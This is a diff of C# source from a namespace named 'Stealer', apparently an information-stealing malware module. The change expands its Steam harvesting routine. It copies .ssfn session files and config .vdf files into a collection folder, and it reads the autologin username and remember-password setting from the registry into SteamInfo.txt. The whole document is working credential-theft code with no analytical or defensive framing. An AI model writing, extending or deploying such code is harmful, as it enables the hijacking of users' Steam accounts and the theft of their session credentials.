@@ -36,16 +36,29 @@ namespace Stealer
                     }
                 }
 
-                // Copy .ssfn flags
-                foreach (string sFile in Directory.GetFiles(sSteamPath))
-                    if (sFile.Contains("ssfn"))
-                        File.Copy(sFile, sSavePath + "\\" + Path.GetFileName(sFile));
-                
+                // Copy .ssfn files
+                if (Directory.Exists(sSteamPath))
+                {
+                    Directory.CreateDirectory(sSavePath + "\\ssnf");
+                    foreach (string file in Directory.GetFiles(sSteamPath))
+                        if (file.Contains("ssfn"))
+                            File.Copy(file, sSavePath + "\\ssnf\\" + Path.GetFileName(file));
+                }
+                // Copy .vdf files
+                string ConfigPath = Path.Combine(sSteamPath, "config");
+                if (Directory.Exists(ConfigPath))
+                {
+                    Directory.CreateDirectory(sSavePath + "\\configs");
+                    foreach (string file in Directory.GetFiles(ConfigPath))
+                        if (file.EndsWith("vdf"))
+                            File.Copy(file, sSavePath + "\\configs\\" + Path.GetFileName(file));
+                }
+
                 Counter.Steam = true;
 
                 string RememberPassword = (int)rkSteam.GetValue("RememberPassword") == 1 ? "Yes" : "No";
                 string sSteamInfo = String.Format(
-                    "\nAutologin User: " + rkSteam.GetValue("AutoLoginUser") +
+                    "Autologin User: " + rkSteam.GetValue("AutoLoginUser") +
                     "\nRemember password: " + RememberPassword
                     );
                 File.WriteAllText(sSavePath + "\\SteamInfo.txt", sSteamInfo);
